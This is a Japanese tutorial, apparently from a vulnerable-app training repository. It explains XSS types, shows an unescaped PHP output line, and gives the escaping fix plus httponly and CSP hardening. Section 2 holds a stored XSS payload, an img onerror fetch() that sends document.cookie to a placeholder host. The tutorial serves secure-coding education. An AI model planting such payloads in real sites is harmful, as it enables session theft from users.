# XSS

## 目次

1. [概要](#1-概要)
2. [脆弱なコードと攻撃](#2-脆弱なコードと攻撃)
3. [原因と修正](#3-原因と修正)
4. [参考](#4-参考)

## 1. 概要

**XSS（Cross-Site Scripting）** とは、Webページに信頼できない入力値がそのまま出力、またはクライアント側でDOMに反映されることで、被害者のブラウザ上で攻撃者のスクリプトが実行されてしまう脆弱性です。

XSSは2つの軸で整理できます。

**挿入される場所による分類（Server XSS / Client XSS）**

- **Server XSS**: スクリプトを、**サーバ側**が生成するHTTP応答に埋め込んでしまう型
- **Client XSS**: スクリプトを、**クライアント側のJavaScript**が実行時にDOMへ書き込んでしまう型

**データの供給元による分類（Reflected XSS / Stored XSS）**

- **Reflected**: リクエストに含めたスクリプトが、その場の応答にそのまま反映されて実行される型
- **Stored**: リクエストに含めたスクリプトがDBやストレージ等に保存され、後のリクエストによってブラウザで実行される型

## 2. 脆弱なコードと攻撃

### 脆弱なコード

`src/posts.php`:

```php
<div class="post-content"><?= nl2br($post['content']) ?></div>
```

### 攻撃（Stored XSS）

攻撃者は、公開投稿の本文にスクリプトを仕込むだけで攻撃を成立させられます。本文は生のまま保存され、公開投稿一覧 `posts.php` を開いたすべてのログインユーザのブラウザ上で実行されます。保存型のため、一度仕込めば閲覧者全員が被害を受けます。

さらに `src/includes/auth.php` ではセッションCookieの `httponly` 属性が明示的に指定されていないため、`document.cookie` をスクリプトから読み取れます。その結果、セッションCookieの窃取が可能です。

#### 手順

1. ログインし、投稿フォーム（`mypage.php`）から公開投稿を作成する。本文に次のようなペイロードを入力し、公開設定で投稿する。

   ```
   <img src=x onerror="fetch('https://xxx?c='+encodeURIComponent(document.cookie))">
   ```

2. ログインユーザが公開投稿一覧 `posts.php` を開くと、投稿された本文がHTMLとして解釈され、スクリプトが被害者のセッションで実行される。

## 3. 原因と修正

### 原因

投稿本文を**HTMLエスケープしていない**ため、保存された投稿本文がHTMLタグやスクリプトとして解釈されてしまいます。

### 修正

出力前にユーザ入力を必ずHTMLエスケープします。

```diff
// 修正前
- <div class="post-content"><?= nl2br($post['content']) ?></div>

// 修正後
+ <div class="post-content"><?= nl2br(h($post['content'])) ?></div>
```

> [!Note]
> 多層防御として、`src/includes/auth.php` のCookie属性 `httponly` を `true` で明示的に設定する、CSP（Content-Security-Policy）を設定するといった対策を併用すると、被害を軽減できます。

## 4. 参考

- [OWASP Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
